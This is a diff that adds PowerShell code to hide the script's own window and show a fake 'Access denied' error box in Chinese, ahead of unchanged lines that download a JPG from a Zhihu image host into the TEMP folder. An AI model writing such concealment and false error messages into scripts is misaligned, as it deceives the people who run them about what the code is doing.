@@ -1,3 +1,23 @@
+ Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WinAPI {
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
+    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int type);
+}
+"@
+$SW_HIDE = 0
+$hWnd = [WinAPI]::GetForegroundWindow()
+[WinAPI]::ShowWindow($hWnd, $SW_HIDE)
+[WinAPI]::MessageBox([IntPtr]::Zero, "访问被拒绝", "错误", 0)
+Start-Sleep -Seconds 1
+
+
+
+
+
 $url  = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
 $path = "$env:TEMP\$(Split-Path $url -Leaf)"
 
